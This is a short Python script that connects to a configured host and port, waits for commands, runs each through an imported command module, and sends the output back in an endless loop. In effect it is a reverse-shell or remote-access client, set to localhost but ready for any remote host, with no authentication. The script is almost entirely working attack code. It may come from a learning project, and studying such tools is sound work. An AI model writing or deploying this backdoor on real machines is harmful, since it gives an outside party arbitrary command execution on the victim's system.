#!/usr/bin/python3
#coding: utf-8

import socket
import logging
from modules import runcommand

logging.basicConfig(format='%(asctime)s: %(message)s', level=logging.DEBUG)

REMOTE_HOST = '127.0.0.1'
REMOTE_PORT = 8081

client = socket.socket()

logging.debug("Connection initiating...")

client.connect((REMOTE_HOST, REMOTE_PORT))

logging.debug("Connection initiated!")

while True:
    logging.debug("Awaiting commands...")

    command = client.recv(1024)
    command = command.decode()

    output = runcommand.run(command=command)

    logging.debug("Sending response...")

    client.send(output)
